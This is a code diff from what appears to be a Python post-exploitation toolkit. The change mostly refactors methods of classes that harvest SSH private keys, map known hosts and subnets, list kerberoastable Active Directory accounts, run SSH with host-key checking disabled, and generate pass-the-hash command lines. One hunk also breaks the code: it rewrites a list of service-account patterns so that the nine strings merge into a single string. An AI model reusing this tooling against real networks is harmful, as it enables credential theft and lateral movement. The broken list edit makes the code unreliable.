@@ -168,7 +168,6 @@ class CredentialHarvester:
                 try:
                     with open(key_path) as f:
                         key_content = f.read()
-
                     # Check if it's actually a private key
                     if "PRIVATE KEY" in key_content:
                         # Try to get username from known_hosts or config
@@ -193,7 +192,8 @@ class CredentialHarvester:
 
         return found
 
-    def harvest_known_hosts(self) -> list[str]:
+    @staticmethod
+    def harvest_known_hosts() -> list[str]:
         """
         Parse SSH known_hosts for target discovery.
 
@@ -281,7 +281,8 @@ class CredentialHarvester:
             pass
         return found_in_file
 
-    def _get_config_files(self, search_paths: list[str], patterns: list[str]):
+    @staticmethod
+    def _get_config_files(search_paths: list[str], patterns: list[str]):
         """Generator for relevant config files"""
         for search_path in search_paths:
             if not os.path.exists(search_path):
@@ -404,7 +405,8 @@ class NetworkMapper:
         self.local_interfaces = interfaces
         return interfaces
 
-    def get_local_subnet(self, ip: str) -> str:
+    @staticmethod
+    def get_local_subnet(ip: str) -> str:
         """Get the /24 subnet for an IP"""
         try:
             network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
@@ -626,7 +628,8 @@ class ADAnalyzer:
         self.domain_info: DomainInfo | None = None
         self.attack_paths: list[AttackPath] = []
 
-    def detect_domain(self) -> str | None:
+    @staticmethod
+    def detect_domain() -> str | None:
         """
         Detect if we're on a domain-joined machine.
 
@@ -687,7 +690,8 @@ class ADAnalyzer:
         self.domain_info = info
         return info
 
-    def get_kerberoastable_users(self) -> list[str]:
+    @staticmethod
+    def get_kerberoastable_users() -> list[str]:
         """
         Get list of potentially kerberoastable users.
 
@@ -697,15 +701,15 @@ class ADAnalyzer:
         # In real implementation, this would query AD for users with SPNs
         # For now, return common service account patterns
         return [
-            "svc_*",
-            "service_*",
-            "sql*",
-            "web*",
-            "iis*",
-            "backup*",
-            "admin*",
-            "exchange*",
-            "sharepoint*",
+            "svc_*,"
+            "service_*,"
+            "sql*,"
+            "web*,"
+            "iis*,"
+            "backup*,"
+            "admin*,"
+            "exchange*,"
+            "sharepoint*,",
         ]
 
     def get_asrep_roastable_users(self) -> list[str]:
@@ -827,7 +831,6 @@ class ADAnalyzer:
                 credentials_needed=creds_needed,
                 probability=probability,
             )
-
         return None
 
 
@@ -852,7 +855,8 @@ class LateralMover:
         self.successful_moves: list[dict[str, Any]] = []
         self.failed_moves: list[dict[str, Any]] = []
 
-    def _prepare_ssh_key(self, key_content: str) -> str:
+    @staticmethod
+    def _prepare_ssh_key(key_content: str) -> str:
         """Securely write SSH key to temp file"""
         import tempfile
 
@@ -862,8 +866,9 @@ class LateralMover:
         os.chmod(key_file, 0o600)
         return key_file
 
+    @staticmethod
     def _execute_ssh(
-        self, cmd_list: list[str], timeout: int = 30
+        cmd_list: list[str], timeout: int = 30
     ) -> tuple[bool, str, str]:
         """Execute SSH command with subprocess"""
         proc = None
@@ -901,7 +906,6 @@ class LateralMover:
                 "Password authentication requires sshpass (Not implemented)"
             )
             return result
-
         key_file = self._prepare_ssh_key(credential.value)
         try:
             ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
@@ -926,8 +930,8 @@ class LateralMover:
 
         return result
 
+    @staticmethod
     def generate_pth_command(
-        self,
         target: str,
         username: str,
         ntlm_hash: str,
@@ -964,7 +968,8 @@ class LateralMover:
 
         return f"{tool} {user_spec}@{target} -hashes :{ntlm_hash}"
 
-    def generate_ptt_command(self, target: str, ticket_path: str) -> str:
+    @staticmethod
+    def generate_ptt_command(target: str, ticket_path: str) -> str:
         """
         Generate Pass-the-Ticket command.
 
